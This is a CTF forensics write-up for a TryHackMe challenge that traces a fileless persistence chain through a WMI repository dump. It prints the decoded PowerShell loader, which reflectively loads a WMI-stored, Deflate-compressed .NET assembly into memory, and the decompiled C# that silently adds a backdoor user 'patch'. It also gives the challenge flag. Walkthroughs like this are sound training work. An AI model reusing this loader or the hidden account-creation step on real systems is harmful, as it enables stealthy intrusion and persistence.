---
title: "After Hours — Day #12"
category: Forensics
difficulty: "Medium"
date: "2026-08-07"
event: "TryHackMe Hacker Holidays"
tags:
  [
    "wmi",
    "windows-forensics",
    "persistence",
    "reverse-engineering",
    "powershell",
  ]
---

## What is forensics?

Forensics is about figuring out what happened, and how, by examining evidence left behind. In a CTF context it usually centers on computers and networks — systems that have been tampered with or used to commit some digital transgression. The first rule is always to preserve the evidence (work on a copy, never the original), then analyze and reconstruct what happened from logs, deleted files, user activity, and artifacts.

## Challenge files

```
challenge_attachments/
├── INDEX.BTR        5,070,848 bytes
├── MAPPING1.MAP         79,528 bytes
├── MAPPING2.MAP         79,528 bytes
├── MAPPING3.MAP         79,528 bytes
└── OBJECTS.DATA      24,199,168 bytes
```

- **`INDEX.BTR`** — almost certainly a Binary Tree Record: a compressed index used to quickly locate files, similar to a phone book of what existed on disk and when.
- **`MAPPING*.MAP`** — NTFS mapping files, tracking where files physically live on disk, useful for tracing files back to their original locations even if moved or deleted.
- **`OBJECTS.DATA`** — the big one: this holds the actual file contents, not just metadata. This is the primary place to dig for evidence.

## Tooling

The challenge also required a .NET decompiler:

```
This challenge requires a .NET decompiler to solve it.

Instructions on how to run ILSpy:
1: Unzip the tool
2: cd artifacts/linux-x64
3: chmod +x ILSpy
4: Run the tool with ./ILSpy
```

A .NET decompiler converts compiled .NET intermediate language (IL/MSIL) back into readable C# source. Attackers often hide malicious logic inside compiled .NET binaries precisely because decompiling them normally takes extra effort — the decompiler is how you actually see what the code does. (ILSpy, dnSpy, and dotPeek are the common free options.)

## Extracting strings from OBJECTS.DATA

```bash
strings -a OBJECTS.DATA > strings-ascii.txt
```

Searching the output for PowerShell invocations:

```bash
cat strings-ascii.txt | grep 'powershell'
```

turned up multiple hits of:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64...>
```

Decoding the base64-encoded, UTF-16 PowerShell payload gave:

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

This is a staged payload loader, not a simple one-liner:

1. **`[WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry'`** — pulls a `ConfigData` value out of WMI. A legitimate-looking WMI query like this is a smart evasion touch: it hides a payload inside what looks like a normal system-information read, and doesn't touch disk.
2. **`DeflateStream(...Decompress)`** — the payload is Base64-encoded _and_ Deflate-compressed, to keep it small and less recognizable as a stored WMI property.
3. The script reads the decompressed bytes into a memory stream in 1024-byte chunks.
4. **`[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke(...)`** — loads the decompressed bytes directly as a .NET assembly **in memory** and invokes its entry point. Nothing is ever written to disk, which is exactly why this kind of technique is hard to catch with simple file-based AV scanning.

## Recovering the payload

Searching the extracted strings for the WMI class name located the actual stored payload — a large Base64/Deflate-compressed blob sitting inside a `MS_SystemInformation` string (the attacker's chosen hiding spot for the "ConfigData" WMI property referenced in the PowerShell above).

Decompressing that blob and saving it as a `.exe` produced a loadable .NET binary, which was opened in ILSpy for analysis.

### Reading the decompiled `Main`

The decompiled logic, simplified:

```csharp
if (string.Equals(Environment.MachineName, "bytelotusdc", StringComparison.OrdinalIgnoreCase))
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.Arguments = "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.CreateNoWindow = true;
    Process.Start(processStartInfo);
}
else
{
    Console.WriteLine("Execution halted: Environment mismatch.");
}
```

Breaking this down:

1. **Hostname check** — the payload only runs if `Environment.MachineName` is exactly `bytelotusdc` (case-insensitive). This is a targeting/evasion guard: run only on the intended machine, stay dormant everywhere else (e.g. in a sandbox with a different hostname).
2. **`ProcessStartInfo` / `cmd.exe`** — prepares to launch a hidden command shell.
3. **The payload command:**

   ```
   net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
   ```

   creates a new local Windows user named `patch` with a password that looks like random noise.

4. **`WindowStyle = Hidden` / `CreateNoWindow = true`** — the command window is never shown, keeping the backdoor account creation silent.

### The "password" is the flag

The suspicious password string is standard Base64. Decoding it gives:

`THM{P4tch_op3ned_th3_BacKd00r}`

## Takeaway

The whole chain — a WMI-stored, Deflate-compressed, Base64-encoded .NET assembly, loaded reflectively straight into memory and gated by a hostname check — is a textbook fileless persistence technique: nothing hits disk until the attacker's backdoor account (`patch`) actually gets created, and even then the only disk-based artifact is a new local user, not a dropped executable.
